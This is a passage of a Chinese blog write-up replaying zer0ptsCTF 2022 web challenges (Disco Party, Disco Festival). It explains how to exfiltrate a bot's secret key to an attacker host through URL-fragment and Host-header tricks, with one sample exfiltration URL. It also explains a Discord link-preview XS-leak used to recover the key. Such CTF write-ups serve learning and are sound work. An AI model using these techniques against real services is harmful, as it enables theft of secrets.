+<p>可以简单地观察到的情况是，当你在discord中发送一个链接的时候，discord是会请求这个链接的，然后在聊天框里出现一个preview</p>
+<h3 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h3><p>所以非预期解是在有效的一个post链接后面添加<code># &lt;vps&gt;</code>，由于题目没有检查hash字段，且最终是将整个url进行拼接，空格又打断了实际上发出去时的url判断，实际上就变成了将vps和后面的参数拼起来又发了一次<br>请求</p>
+<pre><code>http://party.ctf.zer0pts.com:8007/post/0123456789abcdef# http://example.com/
+</code></pre>
+<p>就会实际上将key发送到example.com</p>
+<h3 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h3><p>这里判断url使用的是flask.request.url_root和flask.request.host。而这两个值其实是基于请求的Host header的，只要修改host header就可以发送任意请求了</p>
+<p>这里写的这个bind再match的操作我还以为究极检测，结果就是把自己的urlmap对应起来进行比对，并不受host影响。因此修改host就可以提交任意url，同样的进行外带</p>
+<h2 id="Disco-Festival"><a href="#Disco-Festival" class="headerlink" title="Disco Festival"></a>Disco Festival</h2><p>这个题修了，把report处的代码改掉了<br>并且直接用字符串进行host的检查了，发送的链接也基本上被写死了</p>
+<p>一次修了两个问题，也很稳妥。。。不像我们修了一个又被非预期了，显得很呆。。。害</p>
+<pre class=" language-python"><code class="language-python">HOST <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"HOST"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">)</span>
+PORT <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">,</span> <span class="token string">"8017"</span><span class="token punctuation">)</span>
+NETLOC <span class="token operator">=</span> f<span class="token string">'{HOST}:{PORT}'</span>
+
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    adapter <span class="token operator">=</span> app<span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>NETLOC<span class="token punctuation">)</span>
+    endpoint<span class="token punctuation">,</span> args <span class="token operator">=</span> adapter<span class="token punctuation">.</span>match<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> endpoint <span class="token operator">!=</span> <span class="token string">"get_post"</span> <span class="token operator">or</span> <span class="token string">"id"</span> <span class="token operator">not</span> <span class="token keyword">in</span> args<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid endpoint"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check ID</span>
+    <span class="token keyword">if</span> <span class="token operator">not</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>exists<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid ID"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    message <span class="token operator">=</span> f<span class="token string">"URL: http://{NETLOC}{parsed.path}?key={key}\nReason: {reason}"</span>
+</code></pre>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>还是和之前发一个链接然后discord会去加载一下预览相关</p>
+<p>discord的链接预览似乎是存在着玄幻的全局缓存机制的，也就是说如果其他人在其他地方发了一个url，discord抓取了预览，那么这个预览就是全局的，在另一个服务器发送也会获取到该预览值。并且只要url的参数甚至hash不同，就会重新进行抓取</p>
+<p>通过这个操作进行xs leak</p>
+<p>report处限制了整个消息的长度，而adapter.match对于get_post的这个router<code>/post/&lt;string(length=16):id&gt;</code>的解析实际上也是转换到了正则<code>r&#39;^\|/+?post/+?(?P&lt;id&gt;[^/]&#123;16&#125;)$&#39;</code>。虽然后面半截看不懂，但是开局那个意思应该是允许出现很多斜杠</p>
+<p>因此使用大量的斜杠来截断消息。使bot发送类似<code>http://target///////////.../post/&lt;id&gt;?key=xx</code>的消息，这样子可以控制住发送出去的key的长度。从而逐位leak</p>
+<p>在bot发送了该链接后对字符集进行遍历，能够迅速得到预览的即为命中，可以使用discord bot消息中的embeds属性快速确认是否命中</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hackmd.io/6J49ly7SSAC2pon0IDLxBg">官方wp</a></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>上次忘了什么原因升级了node和hexo，旧版本hexo遇到ssti这种双大括号是会解析错误疯狂报错的，今天发现新版本修了，并且原来的row和endrow标签反而又不能识别了。不过不用加这个玩意本身就是好事</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html" rel="prev" title="HFCTF2022坐牢复现">
+      <i class="fa fa-chevron-left"></i> HFCTF2022坐牢复现
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#zer0ptsCTF2022%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">zer0ptsCTF2022复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GitFile-Explorer"><span class="nav-number">1.1.</span> <span class="nav-text">GitFile Explorer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#miniblog"><span class="nav-number">1.2.</span> <span class="nav-text">miniblog++</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Disco-Party"><span class="nav-number">1.3.</span> <span class="nav-text">Disco Party</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F1"><span class="nav-number">1.3.1.</span> <span class="nav-text">非预期1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F2"><span class="nav-number">1.3.2.</span> <span class="nav-text">非预期2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Disco-Festival"><span class="nav-number">1.4.</span> <span class="nav-text">Disco Festival</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">1.4.1.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">1.5.</span> <span class="nav-text">misc</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">149</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
